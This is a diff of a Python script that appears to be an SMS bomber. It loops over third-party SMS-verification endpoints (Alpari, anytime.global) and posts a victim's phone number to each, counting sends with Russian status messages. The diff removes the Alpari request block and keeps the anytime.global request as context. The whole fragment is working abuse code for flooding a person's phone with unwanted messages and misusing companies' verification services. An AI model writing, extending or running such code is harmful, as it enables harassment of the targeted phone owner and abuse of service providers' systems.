@@ -1416,20 +1416,6 @@ while True:
 
     try:
 
-        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-        R = R + 1
-        print('[+] Alpari отправлено! || Кол-во - '+ str(R))
-        
-        time.sleep(0.1)
-
-    except:
-
-        print('[-] error in sent!')
-
-
-
-    try:
-
         requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
         R = R + 1
         print('[+] SMS отправлено! || Кол-во - '+ str(R))
